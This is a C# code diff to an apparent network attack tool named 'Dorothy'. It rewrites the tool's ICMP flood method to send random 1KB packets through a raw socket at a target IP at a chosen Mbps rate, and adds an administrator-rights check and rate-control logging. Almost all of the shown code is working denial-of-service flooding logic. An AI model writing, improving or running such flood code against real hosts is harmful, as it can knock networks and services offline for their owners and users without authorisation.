@@ -5,6 +5,8 @@ using System.Text;
 using System.Threading;
 using System.Net.NetworkInformation;
 using System.Threading.Tasks;
+using System.Diagnostics; // Added for Stopwatch
+using System.Security.Principal; // Added for WindowsIdentity and WindowsPrincipal
 
 namespace Dorothy
 {
@@ -141,58 +143,100 @@ namespace Dorothy
         }
 
         // Method to start the ICMP flood
-        public void StartIcmpFlood(string targetIp, int mbps, Action<string> log)
+        public Task StartIcmpFlood(string targetIp, int mbps, Action<string> log)
         {
             _stopAttack = false;
-            new Thread(() =>
+            log($"Debug: Entering StartIcmpFlood method");
+
+            // Check if the application is running with elevated privileges
+            if (!IsRunningAsAdmin())
+            {
+                log("Error: ICMP Flood requires administrative privileges. Please run the application as an administrator.");
+                return Task.CompletedTask;
+            }
+
+            return Task.Run(() =>
             {
                 try
                 {
-                    using (Ping pingSender = new Ping())
+                    log($"Debug: Creating raw socket for ICMP");
+                    using (Socket icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
                     {
-                        byte[] buffer = Encoding.ASCII.GetBytes(new string('A', 32)); // ICMP packet payload
-                        PingOptions options = new PingOptions();
+                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), 0);
+                        byte[] buffer = new byte[1024]; // 1KB packet size
+                        new Random().NextBytes(buffer); // Fill buffer with random data
+                        log($"Debug: Buffer created with size: {buffer.Length}");
+
                         long packetsSent = 0;
+                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                         long bytesSent = 0;
-                        long targetBytesPerSecond = mbps * 125000L;
                         DateTime startTime = DateTime.Now;
+
+                        log($"Debug: ICMP Flood initialized. Target: {targetIp}, BytesPerSecond: {bytesPerSecond}");
 
                         while (!_stopAttack)
                         {
-                            PingReply reply = pingSender.Send(targetIp, 1000, buffer, options);
-                            if (reply.Status == IPStatus.Success)
+                            try
                             {
+                                icmpSocket.SendTo(buffer, targetEndpoint);
                                 packetsSent++;
                                 bytesSent += buffer.Length;
                             }
-
-                            if ((DateTime.Now - startTime).TotalSeconds >= 1)
+                            catch (SocketException ex)
                             {
-                                log($"ICMP Flood: {packetsSent} packets sent at {mbps} Mbps");
+                                log($"ICMP Flood error: {ex.Message}");
+                            }
+
+                            if (packetsSent % 1000 == 0) // Log every 1000 packets
+                            {
+                                log($"Debug: ICMP Flood: {packetsSent} packets sent");
+                            }
+
+                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
+                            {
+                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
+                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
+                                log($"Debug: ICMP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");
+
                                 startTime = DateTime.Now;
-                                packetsSent = 0;
                                 bytesSent = 0;
+                                packetsSent = 0;
+
+                                if (actualMbps > mbps)
+                                {
+                                    log($"Debug: Rate exceeded, sleeping for 10ms");
+                                    Thread.Sleep(10);
+                                }
                             }
 
-                            if (bytesSent >= targetBytesPerSecond)
-                            {
-                                Thread.Sleep(1000);
-                                bytesSent = 0;
-                            }
+                            // Calculate the delay needed to match the desired Mbps
+                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
+                            Thread.Sleep((int)delay);
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    log("ICMP Flood error: " + ex.Message);
+                    log($"ICMP Flood error: {ex.Message}");
                 }
-            }).Start();
+                finally
+                {
+                    log("Debug: ICMP Flood attack stopped.");
+                }
+            });
         }
 
         // Method to stop the attack
         public void StopAttack()
         {
             _stopAttack = true;
+        }
+
+        private bool IsRunningAsAdmin()
+        {
+            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+            var principal = new System.Security.Principal.WindowsPrincipal(identity);
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
         }
     }
 }
